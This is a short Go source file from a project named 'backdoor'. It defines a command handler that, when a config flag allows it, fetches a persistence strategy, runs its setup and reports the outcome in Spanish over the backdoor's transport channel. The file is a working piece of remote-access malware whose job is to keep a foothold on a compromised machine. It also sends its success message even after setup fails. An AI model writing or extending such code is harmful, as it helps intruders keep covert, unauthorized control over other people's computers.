package handler

import (
	"backdoor/config"
	"backdoor/persistence"
	"backdoor/transport"
	"fmt"
)

func PersistenceHandler(t transport.Transport) {
	if !config.EnablePersistence {
		t.Write([]byte("Persistencia deshabilitada por configuración"))
		return
	}

	strategy, err := persistence.GetPersistenceStrategy()
	if err != nil {
		t.Write([]byte("Error al aplicar persistencia: " + err.Error() + "\n"))
		return
	}
	if err := strategy.Setup(); err != nil {
		t.Write([]byte(fmt.Sprintf("Error aplicando persistencia: %v\n", err)))
	}
	t.Write([]byte("Persistencia aplicada exitosamente\n"))
}
